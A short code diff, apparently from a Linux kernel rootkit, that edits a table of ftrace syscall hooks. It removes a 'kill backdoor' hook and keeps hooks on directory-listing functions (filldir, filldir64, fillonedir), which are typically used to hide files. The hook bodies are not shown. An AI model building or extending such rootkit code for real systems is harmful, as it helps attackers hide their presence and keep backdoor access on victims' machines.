@@ -3,12 +3,10 @@
 #include "ftrace_helper.h"
 
 //#include "hooks_getdents64.h"
-#include "hooks_kill_backdoor.h"
 #include "hooks_filldir.h"
 
 static struct ftrace_hook syscall_hooks[] = {
     //HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
-    HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK_NOSYS("fillonedir", hook_fillonedir, &orig_fillonedir),
     HOOK_NOSYS("filldir", hook_filldir, &orig_filldir),
     HOOK_NOSYS("filldir64", hook_filldir64, &orig_filldir64),
